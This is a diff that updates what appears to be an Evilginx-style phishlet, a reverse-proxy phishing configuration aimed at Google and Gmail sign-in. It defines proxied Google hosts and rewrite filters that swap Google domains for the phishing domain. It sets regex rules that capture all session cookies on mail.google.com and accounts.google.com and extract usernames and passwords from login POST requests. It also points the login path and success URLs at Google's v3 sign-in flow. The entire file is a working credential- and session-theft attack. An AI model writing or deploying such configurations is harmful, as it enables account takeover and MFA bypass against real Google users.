@@ -1,4 +1,4 @@
-author: '@hash3liZer'
+author: '@ONEKGEE'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false,}
@@ -16,7 +16,7 @@ sub_filters:
   - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.google.com', replace: 'www.{domain}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: 'content.googleapis.com', replace: 'content.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
 auth_tokens:
-  - domain: '.google.com'
+  - domain: 'mail.google.com'
     keys: [".*,regexp"]
   - domain: 'accounts.google.com'
     keys: [".*,regexp"]
@@ -24,11 +24,11 @@ auth_tokens:
     keys: [".*,regexp"]
 credentials:
   username:
-    key: 'f.req'
+    key: 'email'
     search: '\],"([^"]*)"\]$'
     type: 'post'
   password:
-    key: 'f.req'
+    key: 'password'
     search: ',\["([^"]*)",'
     type: 'post'
   custom:
@@ -45,13 +45,13 @@ credentials:
       search: '(.*)'
       type: 'post'
 auth_urls:
-  - '/CheckCookie'
-  - '/ManageAccount'
+  - '/mail'
+  - '/?ogb#inbox'
 login:
   domain: 'accounts.google.com'
-  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+  path: '/v3/signin/identifier?dsh=S-1828382813%3A1681252380179106&authuser=0&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&hl=en&flowName=GlifWebSignIn&flowEntry=AddSession'
 force_post:
-  - path: '/_/signin/sl/challenge'
+  - path: '/v3/signin/identifier?'
     search: 
       - {key: 'f.req', search: '.*'}
       - {key: 'continue', search: '.*'}
